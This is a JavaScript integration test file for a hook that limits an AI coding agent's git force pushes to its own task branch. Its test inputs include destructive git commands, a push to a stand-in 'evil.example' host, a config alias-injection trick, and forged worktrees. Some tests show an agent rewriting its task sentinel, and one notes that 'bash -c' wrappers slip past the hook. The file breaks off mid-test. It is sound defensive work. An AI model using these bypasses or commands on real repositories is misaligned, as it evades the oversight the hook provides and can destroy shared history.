/**
 * Integration tests: own-branch force-with-lease enforcement in the real
 * PreToolUse hook, against real throwaway git repos (no network, no real home).
 *
 * Run with: node --test ai-sdlc-plugin/hooks/enforce-lease-push.test.mjs
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import {
  chmodSync,
  symlinkSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const hookScript = join(__dirname, 'enforce-blocked-actions.js');

const BLOCKED = `  constraints:
    blockedPaths:
      - '.github/workflows/**'
      - '.ai-sdlc/**'
    blockedActions:
      - 'gh pr merge*'
      - 'git merge*'
      - 'git push --force*'
      - 'git push -f*'
      - 'git reset --hard*'
      - 'git checkout -- .'
      - 'git restore .'
`;
const roleYaml = (governance) =>
  `apiVersion: ai-sdlc.io/v1alpha1\nkind: AgentRole\nspec:\n  role: coding-agent\n  goal: test\n${governance}${BLOCKED}`;

const OWN = 'ai-sdlc/aisdlc-1-own';
const LEASE = `  governance:\n    allowForcePush: leaseOnOwnBranch\n    protectedBranches:\n      - release/*\n`;

let base;
let gitEnv;

function git(cwd, ...args) {
  return execFileSync('git', args, { cwd, env: gitEnv, encoding: 'utf-8' }).trim();
}

/** Builds main repo (+ bare origin) with the given policy; returns paths. */
function makeRepo(name, policyYaml, worktreeYaml) {
  const root = join(base, name);
  const bare = join(base, `${name}-origin.git`);
  mkdirSync(root, { recursive: true });
  git(root, 'init', '-q', '-b', 'main');
  mkdirSync(join(root, '.ai-sdlc'), { recursive: true });
  writeFileSync(join(root, '.ai-sdlc', 'agent-role.yaml'), policyYaml);
  writeFileSync(join(root, 'f.txt'), 'x');
  git(root, 'add', '-A');
  git(
    root,
    '-c',
    'user.name=t',
    '-c',
    'user.email=t@example.invalid',
    'commit',
    '-q',
    '-m',
    'init',
  );
  git(base, 'init', '-q', '--bare', bare);
  git(root, 'remote', 'add', 'origin', bare);
  const wt = join(root, '.worktrees', 'aisdlc-1');
  git(root, 'worktree', 'add', '-q', '-b', OWN, wt);
  writeFileSync(join(wt, '.active-task'), 'AISDLC-1\n');
  if (worktreeYaml !== undefined) {
    writeFileSync(join(wt, '.ai-sdlc', 'agent-role.yaml'), worktreeYaml);
  }
  return { root: realpathSync(root), wt: realpathSync(wt) };
}

function addTaskWorktree(root, n) {
  const dir = join(root, '.worktrees', `aisdlc-${n}`);
  git(root, 'worktree', 'add', '-q', '-b', `ai-sdlc/aisdlc-${n}-b`, dir);
  writeFileSync(join(dir, '.active-task'), `AISDLC-${n}\n`);
  return realpathSync(dir);
}

function invoke(payload, { cwd, projectDir, unsetProject = false, env: extraEnv = {} }) {
  const env = { ...gitEnv, ...extraEnv };
  if (!unsetProject) env.CLAUDE_PROJECT_DIR = projectDir;
  try {
    return execFileSync('node', [hookScript], {
      input: JSON.stringify({ ...payload, cwd }),
      cwd,
      env,
      encoding: 'utf-8',
      timeout: 10000,
    }).trim();
  } catch (err) {
    return err.stdout?.trim() || '';
  }
}
const run = (command, opts) => invoke({ tool_name: 'Bash', tool_input: { command } }, opts);
const runWrite = (file_path, opts) =>
  invoke({ tool_name: 'Write', tool_input: { file_path } }, opts);
const denied = (out) => {
  try {
    return JSON.parse(out).hookSpecificOutput?.permissionDecision === 'deny';
  } catch {
    return false;
  }
};

let leaseRepo;
let neverRepo;
let wtCopyRepo;
let inverseRepo;

before(() => {
  base = realpathSync(mkdtempSync(join(tmpdir(), 'lease-push-')));
  const cfg = join(base, 'gitconfig');
  writeFileSync(cfg, '');
  gitEnv = {
    PATH: process.env.PATH,
    HOME: base,
    GIT_CONFIG_GLOBAL: cfg,
    GIT_CONFIG_NOSYSTEM: '1',
    GIT_TERMINAL_PROMPT: '0',
  };
  leaseRepo = makeRepo('lease', roleYaml(LEASE));
  neverRepo = makeRepo('never', roleYaml(''));
  // Trusted (main checkout) policy = never; PR-tree copy in the worktree = lease.
  wtCopyRepo = makeRepo('wtcopy', roleYaml(''), roleYaml(LEASE));
  // Trusted policy = lease; worktree copy tries to turn it off -> still lease.
  inverseRepo = makeRepo('inverse', roleYaml(LEASE), roleYaml(''));
});

after(() => rmSync(base, { recursive: true, force: true }));

const L = () => `git push --force-with-lease origin ${OWN}`;
const LF = () => `git push --force-with-lease origin HEAD:refs/heads/${OWN}`;

describe('leaseOnOwnBranch - allowed', () => {
  it('allows lease push of the worktree own branch (project dir = main checkout)', () => {
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    assert.ok(!denied(out), out);
  });

  it('allows when CLAUDE_PROJECT_DIR is the worktree itself (policy read from main checkout)', () => {
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.wt });
    assert.ok(!denied(out), out);
  });

  it('allows when CLAUDE_PROJECT_DIR is unset', () => {
    const out = run(L(), { cwd: leaseRepo.wt, unsetProject: true });
    assert.ok(!denied(out), out);
  });

  it('allows the fully-qualified HEAD:refs/heads/<own> form', () => {
    const out = run(LF(), {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
    });
    assert.ok(!denied(out), out);
  });

  it('a worktree copy can only TIGHTEN: copy says never while trusted says lease -> blocked (fail closed)', () => {
    const out = run(L(), { cwd: inverseRepo.wt, projectDir: inverseRepo.wt });
    assert.ok(denied(out), out);
  });

  it('plain non-force push of own branch is unaffected', () => {
    const out = run(`git push origin ${OWN}`, { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    assert.ok(!denied(out), out);
  });
});

describe('leaseOnOwnBranch - blocked', () => {
  const cases = [
    ['lease to another branch', 'git push --force-with-lease origin other'],
    ['refspec own:other', `git push --force-with-lease origin ${OWN}:other`],
    ['HEAD:other', 'git push --force-with-lease origin HEAD:other'],
    ['HEAD:<own> (short destination)', `git push --force-with-lease origin HEAD:${OWN}`],
    ['<own>:<own> (short destination)', `git push --force-with-lease origin ${OWN}:${OWN}`],
    ['HEAD:main', 'git push --force-with-lease origin HEAD:main'],
    ['lease to main', 'git push --force-with-lease origin main'],
    ['lease to master', 'git push --force-with-lease origin master'],
    ['refs/heads/main', 'git push --force-with-lease origin refs/heads/main'],
    ['delete :main', 'git push --force-with-lease origin :main'],
    ['--delete own', `git push --force-with-lease --delete origin ${OWN}`],
    ['--mirror', 'git push --force-with-lease --mirror origin'],
    ['plain --force own branch', `git push --force origin ${OWN}`],
    ['-f own branch', `git push -f origin ${OWN}`],
    ['--force after args (no blockedAction prefix match)', `git push origin ${OWN} --force`],
    ['+refspec', `git push origin +${OWN}`],
    ['--force-if-includes alone', `git push --force-if-includes origin ${OWN}`],
    ['no refspec', 'git push --force-with-lease origin'],
    ['raw URL remote', `git push --force-with-lease https://evil.example/x.git ${OWN}`],
    ['unconfigured remote', `git push --force-with-lease evil ${OWN}`],
    ['chained', `${L()} && echo done`],
    ['cd elsewhere', `cd /tmp && ${L()}`],
    ['git -C', `git -C /tmp push --force-with-lease origin ${OWN}`],
    ['GIT_DIR prefix', `GIT_DIR=/tmp/x ${L()}`],
    ['--no-verify', `git push --no-verify --force-with-lease origin ${OWN}`],
    ['abbreviated flag', `git push --force-w origin ${OWN}`],
  ];
  for (const [name, cmd] of cases) {
    it(`blocks ${name}`, () => {
      const out = run(cmd, { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
      assert.ok(denied(out), `${cmd} -> ${out}`);
    });
  }

  it('blocks a lease push from the main checkout on main (own branch is protected)', () => {
    const out = run('git push --force-with-lease origin main', {
      cwd: leaseRepo.root,
      projectDir: leaseRepo.root,
    });
    assert.ok(denied(out), out);
  });

  it('blocks a lease push of a policy-protected own branch', () => {
    git(leaseRepo.wt, 'checkout', '-q', '-b', 'release/1.0');
    const out = run('git push --force-with-lease origin release/1.0', {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
    });
    git(leaseRepo.wt, 'checkout', '-q', OWN);
    assert.ok(denied(out), out);
  });

  it('blocks on a detached HEAD', () => {
    git(leaseRepo.wt, 'checkout', '-q', '--detach');
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    git(leaseRepo.wt, 'checkout', '-q', OWN);
    assert.ok(denied(out), out);
  });
});

describe('never / unset / malformed - behaves exactly as before', () => {
  it('blocks lease push under never (generic blockedActions pattern)', () => {
    assert.ok(denied(run(L(), { cwd: neverRepo.wt, projectDir: neverRepo.root })));
  });

  it('plain force push stays blocked under never', () => {
    assert.ok(
      denied(
        run(`git push --force origin ${OWN}`, { cwd: neverRepo.wt, projectDir: neverRepo.root }),
      ),
    );
  });

  it('with no agent-role.yaml the default is never: force shapes the globs miss are still blocked', () => {
    const r = makeRepo('nopolicy', roleYaml(''));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    assert.ok(denied(run(`git push origin ${OWN} --force`, { cwd: r.wt, projectDir: r.root })));
    assert.ok(!denied(run(`git push origin ${OWN}`, { cwd: r.wt, projectDir: r.root })));
  });

  it('under never, non-prefix force shapes are blocked (strict mode is not bypassable by arg order)', () => {
    const o = { cwd: neverRepo.wt, projectDir: neverRepo.root };
    for (const cmd of [
      'git push origin --force main',
      'git push origin -f HEAD:main',
      'git push origin main --force-with-lease',
      'git push origin +main',
      'git push --forc origin main',
    ]) {
      assert.ok(denied(run(cmd, o)), cmd);
    }
    assert.ok(!denied(run('git push origin main', o)));
    assert.ok(!denied(run('git push --follow-tags origin x', o)));
  });

  for (const v of ['yes', 'always', 'LEASEONOWNBRANCH', '1']) {
    it(`malformed allowForcePush=${v} stays blocked`, () => {
      const r = makeRepo(
        `bad-${v}`.replace(/\W/g, ''),
        roleYaml(`  governance:\n    allowForcePush: ${v}\n`),
      );
      assert.ok(denied(run(L(), { cwd: r.wt, projectDir: r.root })));
    });
  }

  it('boolean false stays blocked', () => {
    const f = makeRepo('boolfalse', roleYaml(`  governance:\n    allowForcePush: false\n`));
    assert.ok(denied(run(L(), { cwd: f.wt, projectDir: f.root })));
  });

  it('boolean true is read as leaseOnOwnBranch (own branch only)', () => {
    const t = makeRepo('booltrue', roleYaml(`  governance:\n    allowForcePush: true\n`));
    assert.ok(!denied(run(L(), { cwd: t.wt, projectDir: t.root })));
    assert.ok(
      denied(run('git push --force-with-lease origin other', { cwd: t.wt, projectDir: t.root })),
    );
  });
});

describe('policy comes from the trusted checkout, never the PR tree', () => {
  it('worktree copy setting leaseOnOwnBranch has NO effect (project dir = worktree)', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, projectDir: wtCopyRepo.wt })));
  });

  it('same with CLAUDE_PROJECT_DIR unset', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, unsetProject: true })));
  });

  it('same with CLAUDE_PROJECT_DIR = main checkout', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, projectDir: wtCopyRepo.root })));
  });
});

describe('fixed integrity rules stay blocked under leaseOnOwnBranch', () => {
  const ctx = () => ({ cwd: leaseRepo.wt, projectDir: leaseRepo.root });

  it('blocks Write/Edit under .ai-sdlc/** (agent-role, attestations, verdicts)', () => {
    for (const rel of [
      '.ai-sdlc/agent-role.yaml',
      '.ai-sdlc/attestations/abc.v6.dsse.json',
      '.ai-sdlc/verdicts/some-task.json',
    ]) {
      assert.ok(denied(runWrite(join(leaseRepo.wt, rel), ctx())), rel);
    }
  });

  it('blocks governance relaxation from the PR tree (editing the worktree agent-role.yaml)', () => {
    assert.ok(
      denied(
        runWrite(join(wtCopyRepo.wt, '.ai-sdlc', 'agent-role.yaml'), {
          cwd: wtCopyRepo.wt,
          projectDir: wtCopyRepo.root,
        }),
      ),
    );
  });

  for (const cmd of [
    'git reset --hard HEAD~1',
    'git checkout -- .',
    'git restore .',
    ['gh', 'pr', 'merge', '5', '--squash'].join(' '),
    'git stash pop',
    'git stash clear',
  ]) {
    it(`blocks ${cmd}`, () => {
      assert.ok(denied(run(cmd, ctx())), cmd);
    });
  }

  it('the lease allowance does not exempt other blockedActions (chained reset)', () => {
    assert.ok(denied(run(`${L()}; git reset --hard`, ctx())));
  });
});

// ── Round-2 additions ────────────────────────────────────────────────

/** Installs a logging `git` shim in front of PATH; optionally failing --git-common-dir. */
function makeGitShim(name) {
  const realGit = execFileSync('which', ['git'], { encoding: 'utf-8' }).trim();
  const dir = join(base, `shim-${name}`);
  mkdirSync(dir, { recursive: true });
  const log = join(dir, 'calls.log');
  writeFileSync(
    join(dir, 'git'),
    `#!/bin/sh
echo "$*" >> "${log}"
if [ -n "$GIT_SHIM_FAIL_COMMON" ]; then
  case "$*" in *--git-common-dir*) exit 1;; esac
fi
if [ -n "$GIT_SHIM_FAIL_VERIFY" ]; then
  case "$*" in *--verify*) exit 128;; esac
fi
exec "${realGit}" "$@"
`,
  );
  chmodSync(join(dir, 'git'), 0o755);
  return { dir, log, env: { PATH: `${dir}:${process.env.PATH}` } };
}
const calls = (shim) => (existsSync(shim.log) ? readFileSync(shim.log, 'utf-8').trim() : '');

describe('protected-branch bypass via git short-name resolution (regression)', () => {
  let r;
  before(() => {
    r = makeRepo(
      'shortname',
      roleYaml(
        `  governance:\n    allowForcePush: leaseOnOwnBranch\n    protectedBranches:\n      - develop\n`,
      ),
    );
    git(r.root, 'push', '-q', 'origin', 'main:develop');
    git(r.wt, 'fetch', '-q', 'origin');
    git(r.wt, 'checkout', '-q', '-b', 'heads/develop', 'origin/develop');
  });

  it('REPRODUCTION: git really resolves HEAD:heads/develop to the remote refs/heads/develop', () => {
    git(
      r.wt,
      '-c',
      'user.name=t',
      '-c',
      'user.email=t@example.invalid',
      'commit',
      '-q',
      '--allow-empty',
      '-m',
      'diverge',
    );
    const before = git(r.wt, 'ls-remote', 'origin', 'refs/heads/develop');
    git(r.wt, 'push', '-q', '--force-with-lease', 'origin', 'HEAD:heads/develop');
    const after = git(r.wt, 'ls-remote', 'origin', 'refs/heads/develop');
    assert.notEqual(before, after, 'the unguarded push updated the remote develop branch');
  });

  for (const cmd of [
    'git push --force-with-lease origin HEAD:heads/develop',
    'git push --force-with-lease origin heads/develop:heads/develop',
    'git push --force-with-lease origin heads/develop',
    'git push --force-with-lease origin HEAD:refs/heads/develop',
  ]) {
    it(`blocks ${cmd}`, () => {
      assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), cmd);
    });
  }

  it('blocks ambiguously named own branches (heads/main, refs/heads/main, tags/x, remotes/origin/main)', () => {
    for (const name of ['heads/main', 'refs/heads/main', 'tags/x', 'remotes/origin/main']) {
      git(r.wt, 'checkout', '-q', '-B', name);
      for (const cmd of [
        `git push --force-with-lease origin HEAD:${name}`,
        `git push --force-with-lease origin ${name}`,
        'git push --force-with-lease origin HEAD:heads/main',
      ]) {
        assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), `${name}: ${cmd}`);
      }
    }
  });
});

describe('fail-closed paths and git-subprocess discipline', () => {
  it('non-git cwd under a lease policy: lease push is denied', () => {
    const nongit = realpathSync(mkdtempSync(join(tmpdir(), 'lease-nongit-')));
    try {
      assert.ok(denied(run(L(), { cwd: nongit, projectDir: leaseRepo.root })));
    } finally {
      rmSync(nongit, { recursive: true, force: true });
    }
  });

  it('cwd in a DIFFERENT repo than the project dir: denied', () => {
    const other = makeRepo('otherrepo', roleYaml(LEASE));
    assert.ok(denied(run(L(), { cwd: other.wt, projectDir: leaseRepo.root })));
  });

  it('trusted main-checkout policy unreadable while the project-dir copy says lease: denied', () => {
    const r = makeRepo('nomain', roleYaml(LEASE), roleYaml(LEASE));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    assert.ok(denied(run(L(), { cwd: r.wt, projectDir: r.wt })));
  });

  it('project-dir copy unreadable (directory in its place): no lease, blockedActions behave as before', () => {
    const r = makeRepo('unreadable', roleYaml(LEASE));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    mkdirSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    // No readable policy at all: nothing new is enforced or granted.
    assert.ok(!denied(run(`git push origin ${OWN}`, { cwd: r.wt, projectDir: r.root })));
  });

  it('git failing to report the common dir (old git): fail closed to never', () => {
    const shim = makeGitShim('nocommon');
    const out = run(L(), {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
      env: { ...shim.env, GIT_SHIM_FAIL_COMMON: '1' },
    });
    assert.ok(denied(out), out);
  });

  it('`never` runs NO git subprocess at all (policy decided from file text)', () => {
    const shim = makeGitShim('never');
    const out = run(L(), { cwd: neverRepo.wt, projectDir: neverRepo.root, env: shim.env });
    assert.ok(denied(out), 'still blocked by blockedActions');
    assert.equal(calls(shim), '', 'no git calls');
  });

  it('lease mode does run git (sanity check on the shim)', () => {
    const shim = makeGitShim('lease');
    run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root, env: shim.env });
    assert.match(calls(shim), /symbolic-ref -q HEAD/);
    assert.match(calls(shim), /--git-common-dir/);
  });

  it('policy is resolved from the project dir repo independent of the tool cwd (other worktree)', () => {
    const wtB = addTaskWorktree(leaseRepo.root, 2);
    const B = 'ai-sdlc/aisdlc-2-b';
    // project dir = worktree A (leaseRepo.wt), push runs from worktree B on its own task branch.
    const ok = run(`git push --force-with-lease origin ${B}`, {
      cwd: wtB,
      projectDir: leaseRepo.wt,
    });
    assert.ok(!denied(ok), ok);
    // ...but B's own-branch rule still applies: pushing A's branch from B is blocked.
    assert.ok(denied(run(L(), { cwd: wtB, projectDir: leaseRepo.wt })));
    // project dir = A whose copy says lease while the main checkout says never: blocked.
    const wcB = addTaskWorktree(wtCopyRepo.root, 2);
    assert.ok(
      denied(
        run(`git push --force-with-lease origin ${B}`, { cwd: wcB, projectDir: wtCopyRepo.wt }),
      ),
    );
  });
});

describe('shell wrappers and env tricks (documented; unchanged from before this feature)', () => {
  const ctx = () => ({ cwd: leaseRepo.wt, projectDir: leaseRepo.root });

  it('bash -c / sh -c payloads are not parsed by this hook or by the legacy prefix patterns', () => {
    assert.ok(!denied(run("bash -c 'git push --force-with-lease origin main'", ctx())));
    assert.ok(!denied(run("sh -c 'git push -f origin main'", ctx())));
  });

  it('xargs git push is seen and blocked', () => {
    assert.ok(denied(run('xargs git push --force-with-lease origin main', ctx())));
  });

  it('NBSP-separated lease push is blocked', () => {
    assert.ok(denied(run(`git push --force-with-lease origin\u00a0${OWN}`, ctx())));
  });

  it('env-prefixed GIT_CONFIG_COUNT alias injection is blocked', () => {
    assert.ok(
      denied(
        run(
          'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.zz GIT_CONFIG_VALUE_0=push git zz --force origin main',
          ctx(),
        ),
      ),
    );
  });
});

describe('adopter blockedActions that are not about force flags keep applying to an allowed lease push', () => {
  it('a `git push *develop*` pattern still blocks, while the force patterns are exempted', () => {
    const r = makeRepo(
      'adopterpattern',
      roleYaml(LEASE).replace("- 'git push -f*'", "- 'git push -f*'\n      - 'git push *develop*'"),
    );
    git(r.wt, 'checkout', '-q', '-b', 'ai-sdlc/aisdlc-1-develop-x');
    assert.ok(
      denied(
        run('git push --force-with-lease origin feat/develop-x', { cwd: r.wt, projectDir: r.root }),
      ),
    );
    git(r.wt, 'checkout', '-q', OWN);
    assert.ok(!denied(run(L(), { cwd: r.wt, projectDir: r.root })));
  });
});

describe('CI-skip floor does not depend on allowForcePush', () => {
  // The PreToolUse hook deliberately does NOT enforce CI-skip tokens; the
  // pre-push gate script does, and it never reads governance policy at all.
  // This pins that: the script blocks a token-carrying commit under both settings.
  const script = join(__dirname, '..', '..', 'scripts', 'check-skip-ci-marker.sh');
  // Built at runtime so no literal magic token appears in any committed file.
  const token = ['[', 'skip', ' ', 'ci', ']'].join('');
  const ZERO = '0'.repeat(40);

  function scan(repo, message) {
    git(
      repo.root,
      '-c',
      'user.name=t',
      '-c',
      'user.email=t@example.invalid',
      'commit',
      '-q',
      '--allow-empty',
      '-m',
      message,
    );
    const sha = git(repo.root, 'rev-parse', 'HEAD');
    return spawnSync('bash', [script], {
      cwd: repo.root,
      env: gitEnv,
      input: `refs/heads/x ${sha} refs/heads/x ${ZERO}\n`,
      encoding: 'utf-8',
    });
  }

  for (const [label, gov] of [
    ['never', ''],
    ['leaseOnOwnBranch', LEASE],
  ]) {
    it(`blocks a commit carrying a CI-skip token under ${label}`, () => {
      const r = makeRepo(`ciskip-${label}`, roleYaml(gov));
      const res = scan(r, `chore: x ${token}`);
      assert.equal(res.status, 1, res.stderr);
      assert.match(res.stderr, /CI-skip magic token/);
    });

    it(`passes a clean commit under ${label}`, () => {
      const r = makeRepo(`ciskipclean-${label}`, roleYaml(gov));
      assert.equal(scan(r, 'chore: x (skip ci marker)').status, 0);
    });
  }
});

describe('tag / notes / alias overwrite via short destination (regression, real git)', () => {
  const G = ['-c', 'user.name=t', '-c', 'user.email=t@example.invalid'];
  let r;
  before(() => {
    r = makeRepo('tagalias', roleYaml(LEASE));
    git(r.root, ...G, 'commit', '-q', '--allow-empty', '-m', 'seed');
    git(r.root, 'push', '-q', 'origin', 'main');
    git(r.root, 'tag', 'v1.2.3');
    git(r.root, 'push', '-q', 'origin', 'v1.2.3');
    git(r.wt, 'fetch', '-q', 'origin');
  });

  it('REPRODUCTION: a branch named like a remote tag force-overwrites that tag via HEAD:<name>', () => {
    git(r.wt, 'checkout', '-q', '-b', 'v1.2.3');
    git(r.wt, ...G, 'commit', '-q', '--allow-empty', '-m', 'divergent');
    const tagBefore = git(r.wt, 'ls-remote', 'origin', 'refs/tags/v1.2.3').split('\t')[0];
    git(r.wt, 'push', '-q', `--force-with-lease=v1.2.3:${tagBefore}`, 'origin', 'HEAD:v1.2.3');
    const tagAfter = git(r.wt, 'ls-remote', 'origin', 'refs/tags/v1.2.3').split('\t')[0];
    assert.notEqual(tagBefore, tagAfter, 'the unguarded push really overwrote the remote tag');
  });

  it('the hook denies that exploit (and the lease-pinned and refs/notes variants)', () => {
    for (const name of ['v1.2.3', 'notes/commits', 'meta/config']) {
      git(r.wt, 'checkout', '-q', '-B', name);
      const tag = '0123456789abcdef0123456789abcdef01234567';
      for (const cmd of [
        `git push --force-with-lease=${name}:${tag} origin HEAD:${name}`,
        `git push --force-with-lease origin HEAD:${name}`,
        `git push --force-with-lease origin ${name}:${name}`,
        `git push --force-with-lease origin ${name}`,
        `git push --force-with-lease origin HEAD:refs/heads/${name}`,
      ]) {
        assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), `${name}: ${cmd}`);
      }
    }
    git(r.wt, 'checkout', '-q', OWN);
  });

  it('a task-named branch is also refused when a local tag / refs/<name> / remote-tracking ref answers to its name', () => {
    for (const ref of [`refs/tags/${OWN}`, `refs/${OWN}`, `refs/remotes/${OWN}`]) {
      git(r.wt, 'update-ref', ref, 'HEAD');
      for (const cmd of [L(), LF()]) {
        assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), `${ref}: ${cmd}`);
      }
      git(r.wt, 'update-ref', '-d', ref);
    }
    assert.ok(
      !denied(run(LF(), { cwd: r.wt, projectDir: r.root })),
      'clear again once the alias is gone',
    );
  });

  it('the alias probe failing (git error, not "missing") denies', () => {
    const shim = makeGitShim('verifyfail');
    const out = run(LF(), {
      cwd: r.wt,
      projectDir: r.root,
      env: { ...shim.env, GIT_SHIM_FAIL_VERIFY: '1' },
    });
    assert.ok(denied(out), out);
  });
});

describe('own = the dispatched TASK branch', () => {
  const sentinel = (wt) => join(wt, '.active-task');
  let r;
  before(() => {
    r = makeRepo('taskbind', roleYaml(LEASE));
  });

  it('allows with a matching sentinel (baseline)', () => {
    assert.ok(!denied(run(LF(), { cwd: r.wt, projectDir: r.root })));
  });

  it('denies with no sentinel (operator session), empty or malformed sentinel', () => {
    for (const content of [null, '', '\n', 'not a task id', 'AISDLC-', '../../etc']) {
      if (content === null) rmSync(sentinel(r.wt));
      else writeFileSync(sentinel(r.wt), content);
      assert.ok(denied(run(LF(), { cwd: r.wt, projectDir: r.root })), JSON.stringify(content));
    }
    writeFileSync(sentinel(r.wt), 'AISDLC-1\n');
  });

  it('denies when the agent rewrites .active-task to another task (dir name and branch disagree)', () => {
    writeFileSync(sentinel(r.wt), 'AISDLC-700\n');
    assert.ok(denied(run(LF(), { cwd: r.wt, projectDir: r.root })));
    writeFileSync(sentinel(r.wt), 'AISDLC-1\n');
  });

  it('denies a branch outside the task prefix even with a consistent sentinel and directory', () => {
    const dir = join(r.root, '.worktrees', 'aisdlc-7');
    git(r.root, 'worktree', 'add', '-q', '-b', 'feat/not-a-task-branch', dir);
    writeFileSync(join(dir, '.active-task'), 'AISDLC-7\n');
    const wt7 = realpathSync(dir);
    assert.ok(
      denied(
        run('git push --force-with-lease origin feat/not-a-task-branch', {
          cwd: wt7,
          projectDir: r.root,
        }),
      ),
    );
  });

  it('denies when the worktree directory is not named after the task', () => {
    const dir = join(r.root, '.worktrees', 'scratch');
    git(r.root, 'worktree', 'add', '-q', '-b', 'ai-sdlc/aisdlc-8-x', dir);
    writeFileSync(join(dir, '.active-task'), 'AISDLC-8\n');
    const wt8 = realpathSync(dir);
    assert.ok(
      denied(
        run('git push --force-with-lease origin ai-sdlc/aisdlc-8-x', {
          cwd: wt8,
          projectDir: r.root,
        }),
      ),
    );
  });
});

describe('an internal error while evaluating a push is a DENY, not an allow', () => {
  it('a throwing guard (injected via a preload) denies git push but not unrelated commands', () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'lease-throw-')));
    try {
      const guardPath = join(__dirname, 'lib', 'lease-push-guard.js');
      const preload = join(dir, 'preload.cjs');
      writeFileSync(
        preload,
        `const m = require(${JSON.stringify(guardPath)});\nm.evaluateLeasePush = () => { throw new Error('boom'); };\n`,
      );
      const env = { NODE_OPTIONS: `--require ${preload}` };
      const o = { cwd: leaseRepo.wt, projectDir: leaseRepo.root, env };
      assert.ok(denied(run(L(), o)));
      assert.ok(denied(run(LF(), o)));
      assert.ok(!denied(run('echo hi', o)));
      assert.ok(!denied(run('ls', o)));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('worktree authenticity (forged bindings)', () => {
  let r;
  before(() => {
    r = makeRepo('forge', roleYaml(LEASE));
  });
  const push = (b) => `git push --force-with-lease origin ${b}`;

  it('legit .worktrees/<id> worktree is allowed (baseline)', () => {
    assert.ok(!denied(run(L(), { cwd: r.wt, projectDir: r.root })));
  });

  it('REPRODUCTION + regression: a forged worktree OUTSIDE .worktrees bound to another task is denied', () => {
    const B = 'ai-sdlc/aisdlc-700-x';
    const forged = join(base, 'forged-x', 'aisdlc-700');
    git(r.root, 'worktree', 'add', '-q', '-b', B, forged);
    writeFileSync(join(forged, '.active-task'), 'AISDLC-700\n');
    const cwd = realpathSync(forged);
    // Everything the three-way binding checks agrees (sentinel, dir name, branch)...
    assert.equal(git(cwd, 'symbolic-ref', '-q', 'HEAD'), `refs/heads/${B}`);
    // ...but the directory is not a dispatched worktree under <main>/.worktrees/.
    assert.ok(denied(run(push(B), { cwd, projectDir: r.root })));
    assert.ok(denied(run(push(B), { cwd, projectDir: cwd })));
  });

  it('a worktree whose .git file points at a hand-forged gitdir (commondir -> real repo) is denied', () => {
    const B = 'ai-sdlc/aisdlc-701-x';
    const dir = join(r.root, '.worktrees', 'aisdlc-701');
    const fake = join(base, 'fake-gitdir');
    mkdirSync(dir, { recursive: true });
    mkdirSync(fake, { recursive: true });
    writeFileSync(join(fake, 'HEAD'), `ref: refs/heads/${B}\n`);
    writeFileSync(join(fake, 'commondir'), `${join(r.root, '.git')}\n`);
    writeFileSync(join(fake, 'gitdir'), `${join(dir, '.git')}\n`);
    writeFileSync(join(dir, '.git'), `gitdir: ${fake}\n`);
    writeFileSync(join(dir, '.active-task'), 'AISDLC-701\n');
    const cwd = realpathSync(dir);
    // Precondition: git really accepts the forgery as a checkout of that branch.
    assert.equal(git(cwd, 'symbolic-ref', '-q', 'HEAD'), `refs/heads/${B}`);
    assert.ok(denied(run(push(B), { cwd, projectDir: r.root })));
  });

  it('a symlinked .worktrees entry pointing at a real worktree elsewhere is denied', () => {
    const B = 'ai-sdlc/aisdlc-5-x';
    const real = join(base, 'elsewhere', 'aisdlc-5');
    git(r.root, 'worktree', 'add', '-q', '-b', B, real);
    writeFileSync(join(real, '.active-task'), 'AISDLC-5\n');
    const link = join(r.root, '.worktrees', 'aisdlc-5');
    symlinkSync(real, link);
    assert.ok(denied(run(push(B), { cwd: link, projectDir: r.root })));
    assert.ok(denied(run(push(B), { cwd: realpathSync(real), projectDir: r.root })));
  });

  it('project dir outside the main checkout / .worktrees is denied', () => {
    const outside = join(base, 'forged-x', 'aisdlc-700');
    assert.ok(denied(run(L(), { cwd: r.wt, projectDir: realpathSync(outside) })));
  });

  it('an operator main checkout (not under .worktrees) gets no lease push even on a task-named branch', () => {
    const op = makeRepo('opmain', roleYaml(LEASE));
    // Main checkout itself on a task-named branch with a sentinel and a matching directory name.
    const mainDir = join(base, 'opmain');
    const dirNamed = join(base, 'aisdlc-9');
    git(base, 'init', '-q', '-b', 'main', dirNamed);
    mkdirSync(join(dirNamed, '.ai-sdlc'), { recursive: true });
    writeFileSync(join(dirNamed, '.ai-sdlc', 'agent-role.yaml'), roleYaml(LEASE));
    git(dirNamed, ...['-c', 'user.name=t', '-c', 'user.email=t@example.invalid'], 'add', '-A');
    git(
      dirNamed,
      '-c',
      'user.name=t',
      '-c',
      'user.email=t@example.invalid',
      'commit',
      '-q',
      '-m',
      'i',
    );
    git(dirNamed, 'checkout', '-q', '-b', 'ai-sdlc/aisdlc-9-x');
